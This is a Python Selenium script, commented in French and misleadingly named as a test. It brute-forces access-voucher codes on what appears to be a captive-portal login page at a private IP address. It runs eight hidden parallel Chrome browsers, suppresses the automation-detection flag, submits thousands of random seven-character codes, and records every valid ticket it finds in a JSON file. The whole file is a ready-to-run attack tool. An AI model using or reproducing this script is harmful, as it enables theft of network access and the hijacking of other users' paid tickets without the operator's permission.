# test_voucher_codes.py
import time
import random
import string
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


URL = "http://10.10.10.254:8002/index.php?zone=ablo_net"
VALID_CODES_FILE = "tickets_valides.json"

# Verrous
codes_lock = Lock()
file_lock = Lock()
used_codes = set()
valid_codes = []


def generate_unique_code() -> str:
    """Génère un code unique qui n'a jamais été testé."""
    with codes_lock:
        max_attempts = 10000
        for _ in range(max_attempts):
            letters = random.choices(string.ascii_lowercase, k=3)
            digits = random.choices(string.digits, k=4)
            code_chars = letters + digits
            random.shuffle(code_chars)
            code = "".join(code_chars)

            if code not in used_codes:
                used_codes.add(code)
                return code

    raise RuntimeError("Impossible de générer un code unique")


def save_valid_code(code: str, thread_id: int, redirect_url: str):
    """Sauvegarde un ticket valide dans le fichier JSON."""
    with file_lock:
        entry = {
            "code": code,
            "thread_id": thread_id,
            "timestamp": datetime.now().isoformat(),
            "redirect_url": redirect_url,
            "total_attempts": len(used_codes)
        }

        valid_codes.append(entry)

        # Sauvegarder immédiatement dans le fichier
        try:
            with open(VALID_CODES_FILE, 'w', encoding='utf-8') as f:
                json.dump(valid_codes, f, indent=2, ensure_ascii=False)
            print(f"💾 Ticket sauvegardé dans {VALID_CODES_FILE}")
        except Exception as e:
            print(f"⚠️  Erreur sauvegarde: {e}")


def create_driver(visible=False):
    """Crée une instance de driver Chrome optimisée."""
    options = webdriver.ChromeOptions()
    options.add_argument("--window-size=800,600")

    if not visible:
        options.add_argument("--headless")  # Mode sans interface

    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-images")

    # Performance
    prefs = {
        "profile.managed_default_content_settings.images": 2,
        "profile.default_content_setting_values.notifications": 2,
    }
    options.add_experimental_option("prefs", prefs)

    options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    service = Service(executable_path=r"C:\Users\FR\Downloads\aude_web\chromedriver.exe")

    return webdriver.Chrome(service=service, options=options)


def submit_code_fast(driver, code: str, thread_id: int) -> tuple[bool, str]:
    """Version ultra-rapide du submit."""
    try:
        current_url = driver.current_url

        # Remplir et soumettre
        input_box = driver.find_element(By.CSS_SELECTOR, 'input[name="auth_voucher"]')
        input_box.clear()
        input_box.send_keys(code)

        submit_button = driver.find_element(By.CSS_SELECTOR, '#KV input[name="accept"][type="submit"]')
        driver.execute_script("arguments[0].click();", submit_button)

        # Attente minimale pour la redirection
        time.sleep(0.2)

        # Vérifier redirection (ticket valide)
        new_url = driver.current_url
        if new_url != current_url:
            save_valid_code(code, thread_id, new_url)
            return True, f"VALIDE! → {new_url}"

        # Récupérer l'erreur
        try:
            error_element = driver.find_element(By.ID, "error-message")
            msg = error_element.text.strip()
            return False, msg if msg else "Invalide"
        except:
            return False, "Invalide"

    except Exception as e:
        return False, f"Erreur: {str(e)[:50]}"


def worker_thread(thread_id: int, num_attempts: int, stop_on_first: bool = False):
    """Thread worker qui teste des codes en parallèle."""
    driver = create_driver(visible=False)  # Changez à True pour voir les fenêtres
    attempt = 0
    local_valid_count = 0

    try:
        # Ouvrir la page
        driver.get(URL)
        time.sleep(1)

        # Cliquer sur l'onglet Code Ticket
        try:
            tab_button = driver.find_element(By.ID, "defaultOpen")
            driver.execute_script("arguments[0].click();", tab_button)
            time.sleep(0.3)
        except:
            pass

        while attempt < num_attempts:
            attempt += 1
            code = generate_unique_code()

            success, msg = submit_code_fast(driver, code, thread_id)

            status = "✅" if success else "❌"
            print(f"[T{thread_id}] {status} {attempt:04d} | {code} | {msg[:50]}")

            if success:
                local_valid_count += 1
                print(f"\n{'='*70}")
                print(f"🎉 TICKET #{len(valid_codes)} TROUVÉ PAR THREAD {thread_id}!")
                print(f"🎫 Code: {code}")
                print(f"📊 Total codes testés: {len(used_codes)}")
                print(f"{'='*70}\n")

                if stop_on_first:
                    break

    except Exception as e:
        print(f"[T{thread_id}] Erreur: {e}")
    finally:
        driver.quit()

    return local_valid_count


def main_parallel(num_threads=8, attempts_per_thread=1000, stop_on_first=False):
    """
    Lance plusieurs threads en parallèle pour tester rapidement.

    Args:
        num_threads: Nombre de threads (fenêtres Chrome)
        attempts_per_thread: Nombre de tentatives par thread
        stop_on_first: Si True, arrête dès le premier ticket trouvé
    """
    global valid_codes
    valid_codes = []

    # Charger les tickets déjà trouvés
    try:
        with open(VALID_CODES_FILE, 'r', encoding='utf-8') as f:
            valid_codes = json.load(f)
        print(f"📂 {len(valid_codes)} ticket(s) déjà trouvé(s) chargé(s)")
    except FileNotFoundError:
        print(f"📂 Nouveau fichier {VALID_CODES_FILE} sera créé")
    except Exception as e:
        print(f"⚠️  Erreur lecture fichier: {e}")

    print(f"🚀 Lancement de {num_threads} fenêtres Chrome en parallèle")
    print(f"🎯 URL: {URL}")
    print(f"⚡ Mode TURBO activé")
    print(f"💾 Sauvegarde: {VALID_CODES_FILE}")
    print("-" * 70)

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for i in range(num_threads):
            future = executor.submit(worker_thread, i+1, attempts_per_thread, stop_on_first)
            futures.append(future)

        # Attendre que tous les threads finissent
        total_found = 0
        for future in futures:
            result = future.result()
            total_found += result

    elapsed = time.time() - start_time

    print(f"\n{'='*70}")
    print(f"📊 STATISTIQUES FINALES:")
    print(f"   - Durée: {elapsed:.2f}s")
    print(f"   - Codes testés: {len(used_codes)}")
    print(f"   - Vitesse: {len(used_codes)/elapsed:.1f} codes/sec")
    print(f"   - Tickets valides trouvés: {len(valid_codes)}")
    print(f"   - Fichier: {VALID_CODES_FILE}")
    print(f"{'='*70}")


if __name__ == "__main__":
    # MODE 1: Chercher jusqu'à trouver au moins 1 ticket (arrêt auto)
    # main_parallel(num_threads=8, attempts_per_thread=1000, stop_on_first=True)

    # MODE 2: Chercher autant de tickets que possible (continue jusqu'à la fin)
    main_parallel(num_threads=8, attempts_per_thread=2000, stop_on_first=False)
